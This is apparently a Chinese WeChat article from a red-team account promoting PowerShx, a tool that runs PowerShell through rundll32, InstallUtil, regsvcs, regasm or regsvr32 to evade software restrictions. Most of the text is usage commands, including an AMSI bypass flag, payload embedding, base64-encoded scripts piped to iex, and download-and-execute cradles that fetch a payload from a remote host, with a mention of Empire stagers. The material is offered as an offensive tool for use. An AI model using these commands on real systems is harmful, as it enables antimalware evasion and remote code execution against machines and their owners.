#  神兵利器 - PowerShx 不受软件限制运行Powershell

iomoath  [ Khan安全攻防实验室 ](javascript:void\(0\);)

**Khan安全攻防实验室** ![]()

微信号 KhanCJSH

功能介绍 安全不是一个人，我们来自五湖四海。研究方向Web内网渗透，免杀技术，红蓝攻防对抗，CTF。

____

__

收录于话题

  

        使用 DLL 或独立可执行文件的非托管 PowerShell 执行。

  

![](https://gitee.com/fuli009/images/raw/master/public/20211015090901.png)

  

  

        PowerShx 是对PowerShdll项目的重写和扩展。PowerShx 提供绕过 AMSI 和运行 PS Cmdlet 的功能。

  

### 特征

  * 使用 rundll32.exe、installutil.exe、regsvcs.exe 或 regasm.exe、regsvr32.exe 运行带有 DLL 的 Powershell。

  * 在没有 powershell.exe 或 powershell_ise.exe 的情况下运行 Powershell

  * AMSI 旁路功能。

  * 直接从命令行或 Powershell 文件运行 Powershell 脚本

  * 导入 Powershell 模块并执行 Powershell Cmdlets。

## 用法

####

#### 运行dll32

  

  *   *   *   *   *   *   * 

    
    
    rundll32 PowerShx.dll,main -e                           <PS script to run>rundll32 PowerShx.dll,main -f <path>                    Run the script passed as argumentrundll32 PowerShx.dll,main -f <path> -c <PS Cmdlet>     Load a script and run a PS cmdletrundll32 PowerShx.dll,main -w                           Start an interactive console in a new windowrundll32 PowerShx.dll,main -i                           Start an interactive consolerundll32 PowerShx.dll,main -s                           Attempt to bypass AMSIrundll32 PowerShx.dll,main -v                           Print Execution Output to the console

  

#### 替代

  

  *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    1.     x86 - C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U PowerShx.dll    x64 - C:\Windows\Microsoft.NET\Framework64\v4.0.3031964\InstallUtil.exe /logfile= /LogToConsole=false /U PowerShx.dll2.     x86 C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe PowerShx.dll    x64 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe PowerShx.dll3.     x86 C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U PowerShx.dll    x64 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U PowerShx.dll4.     regsvr32 /s  /u PowerShx.dll -->Calls DllUnregisterServer    regsvr32 /s PowerShx.dll --> Calls DllRegisterServer

  

### exe 版本

  

  *   *   *   *   * 

    
    
    PowerShx.exe -i                          Start an interactive consolePowerShx.exe -e                          <PS script to run>PowerShx.exe -f <path>                   Run the script passed as argumentPowerShx.exe -f <path> -c <PS Cmdlet>    Load a script and run a PS cmdletPowerShx.exe -s                          Attempt to bypass AMSI.

  

## 嵌入式有效载荷

  

       可以通过更新“Common”项目中的数据字典“Common.Payloads.PayloadDict”并在方法 PsSession.cs -> Handle() 中调用它来嵌入有效负载。示例：在 Handle() 方法中：

  

  *   *   *   *   * 

    
    
    private void Handle(Options options){  // Pre-execution before user script  _ps.Exe(Payloads.PayloadDict["amsi"]);}

  

## 例子

  

#### 运行 base64 编码的脚本

  

  *   *   * 

    
    
    rundll32 PowerShx.dll,main [System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String("BASE64")) ^| iex  
    PowerShx.exe -e [System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String("BASE64")) ^| iex

  

注意：Empire stagers 需要使用 [System.Text.Encoding]::Unicode 解码

  

#### 运行 base64 编码的脚本

  

  *   *   * 

    
    
    rundll32 PowerShx.dll,main . { iwr -useb https://website.com/Script.ps1 } ^| iex;  
    PowerShx.exe -e "IEX ((new-object net.webclient).downloadstring('http://192.168.100/payload-http'))"

  

项目地址：

  

aHR0cHM6Ly9naXRodWIuY29tL2lvbW9hdGgvUG93ZXJTaHg=

预览时标签不可点

收录于话题 #

个 __

上一篇 下一篇

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![示意图](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

神兵利器 - PowerShx 不受软件限制运行Powershell

最多200字，当前共字

__

发送中

写下你的留言

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。 视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

